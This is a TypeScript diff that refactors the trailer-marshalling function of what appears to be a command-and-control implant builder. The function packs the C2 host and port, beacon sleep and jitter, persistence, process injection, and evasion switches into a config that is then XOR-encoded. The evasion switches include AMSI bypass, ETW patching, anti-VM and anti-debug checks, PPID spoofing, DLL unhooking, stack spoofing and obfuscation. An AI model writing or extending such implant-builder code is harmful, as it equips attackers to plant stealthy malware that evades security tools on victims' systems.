@@ -34,24 +34,52 @@ function tf(v: boolean | undefined, fallback = false): string {
   return (v ?? fallback) ? 'true' : 'false'
 }
 
-export function marshalTrailer(cfg: WrapConfig): Uint8Array {
+function quotedMap(cfg: WrapConfig): Record<string, string> {
   const port = String(cfg.ServerPort || 443)
   const useTls = cfg.UseTLS || port === '443' ? 'true' : 'false'
   const key = cfg.EncryptedComms === false ? '' : (cfg.EncryptionKey || '')
   const inj = cfg.ProcessInjection ? (cfg.InjectionMethod || 'crt') : 'none'
   const sleep = String(cfg.SleepInterval && cfg.SleepInterval > 0 ? cfg.SleepInterval : 15)
   const jit = String(cfg.Jitter != null && cfg.Jitter >= 0 ? cfg.Jitter : 20)
-  const json =
-    `{"c2_host":${esc(cfg.ServerHost)},"c2_port":${esc(port)},"use_tls":${esc(useTls)},` +
-    `"sleep_interval":${esc(sleep)},"jitter":${esc(jit)},"persistence":${esc(tf(cfg.Persistence, false))},` +
-    `"hide_console":${esc(tf(cfg.HideConsole, true))},"key":${esc(key)},"injection_method":${esc(inj)},` +
-    `"anti_debug":${esc(tf(cfg.AntiDebug, false))},"anti_vm":${esc(tf(cfg.AntiVM, false))},` +
-    `"sleep_obfuscation":${esc(tf(cfg.SleepObfuscation, false))},` +
-    `"amsi_bypass":${esc(tf(cfg.AmsiBypass, true))},"etw_patch":${esc(tf(cfg.EtwPatch, true))},` +
-    `"ppid_spoof":${esc(tf(cfg.PpidSpoof, false))},"dll_unhook":${esc(tf(cfg.DllUnhook, false))},` +
-    `"heap_encrypt":${esc(tf(cfg.HeapEncrypt, false))},"stack_spoof":${esc(tf(cfg.StackSpoof, false))},` +
-    `"obfuscation":${esc(tf(cfg.Obfuscation, true))}}`
-  return new TextEncoder().encode(json)
+  const out: Record<string, string> = {
+    c2_host: cfg.ServerHost || '',
+    c2_port: port,
+    use_tls: useTls,
+    sleep_interval: sleep,
+    jitter: jit,
+    persistence: tf(cfg.Persistence, false),
+    hide_console: tf(cfg.HideConsole, true),
+    key,
+    injection_method: inj,
+    anti_debug: tf(cfg.AntiDebug, false),
+    anti_vm: tf(cfg.AntiVM, false),
+    sleep_obfuscation: tf(cfg.SleepObfuscation, false),
+    amsi_bypass: tf(cfg.AmsiBypass, true),
+    etw_patch: tf(cfg.EtwPatch, true),
+    ppid_spoof: tf(cfg.PpidSpoof, false),
+    dll_unhook: tf(cfg.DllUnhook, false),
+    heap_encrypt: tf(cfg.HeapEncrypt, false),
+    stack_spoof: tf(cfg.StackSpoof, false),
+    obfuscation: tf(cfg.Obfuscation, true),
+  }
+  const raw = (cfg.CustomConfig || '').trim()
+  if (raw) {
+    try {
+      const extra = JSON.parse(raw) as Record<string, unknown>
+      for (const [k, v] of Object.entries(extra)) {
+        if (v == null) continue
+        out[k] = typeof v === 'string' ? v : String(v)
+      }
+    } catch { /* ignore bad advanced JSON */ }
+  }
+  if (out.c2_port === '443') out.use_tls = 'true'
+  return out
+}
+
+export function marshalTrailer(cfg: WrapConfig): Uint8Array {
+  const map = quotedMap(cfg)
+  const body = '{' + Object.entries(map).map(([k, v]) => `${JSON.stringify(k)}:${esc(v)}`).join(',') + '}'
+  return new TextEncoder().encode(body)
 }
 
 function xorBody(json: Uint8Array): Uint8Array {
